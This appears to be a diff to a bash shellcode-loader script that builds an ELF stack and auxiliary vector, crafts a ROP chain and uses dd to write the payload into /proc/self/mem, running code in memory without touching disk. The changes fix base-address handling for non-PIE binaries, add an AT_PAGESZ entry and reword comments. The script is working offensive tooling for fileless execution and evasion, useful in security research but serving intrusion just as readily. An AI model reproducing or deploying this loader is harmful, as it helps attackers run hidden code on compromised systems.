@@ -203,7 +203,7 @@ shellcode_loader()
 
     local entry=$((0x$(endian ${header:48:16})))
 
-    local base=""
+    local base=0
     local writebin=""
     local sc=""
     if [ $1 = "bin" ]
@@ -247,8 +247,6 @@ shellcode_loader()
                     base=$((0x$3))
                 fi
                 entry=$((entry + base))
-            else                                  # Non-PIE
-                base=0
             fi
         fi
         virt=$(printf %016x $((0x$virt + base)))
@@ -358,7 +356,7 @@ shellcode_loader()
 
     echo -n "$sc $writebin $phnum $phentsize $phaddr $entry"
 }
-# craft_stack $phaddr $phentsize $phnum $ld_base $entry $argv
+# craft_stack $phaddr $phentsize $phnum $ld_base $entry $argv0 .. $argvn
 craft_stack()
 {
     # Calculate position of argv[0]
@@ -404,6 +402,7 @@ craft_stack()
     auxv=$auxv"0700000000000000"$(endian $4)       # ld_base
     auxv=$auxv"0900000000000000"$5                 # entry
     auxv=$auxv"1900000000000000"$at_random         # AT_RANDOM
+    auxv=$auxv"0600000000000000""0010000000000000" # AT_PAGESZ
     auxv=$auxv"0000000000000000""0000000000000000" # AT_NULL
     auxv=$auxv"aaaaaaaaaaaaaaaa""bbbbbbbbbbbbbbbb" # Will be two random values
 
@@ -626,7 +625,7 @@ rop=$(craft_rop $sc_len)
 rop_len=$((${#rop} / 2))
 
 payload=$(echo -n $rop$payload2 | sed 's/\([0-9A-F]\{2\}\)/\\x\1/gI')
-# Have fun!
+# I'm going in, wish me luck...
 printf $payload |\
 (sleep .1; $noaslr env -i $filename bs=$rop_len count=1 of=/proc/self/mem \
 seek=$write_to_addr conv=notrunc oflag=seek_bytes iflag=fullblock) 2>&1
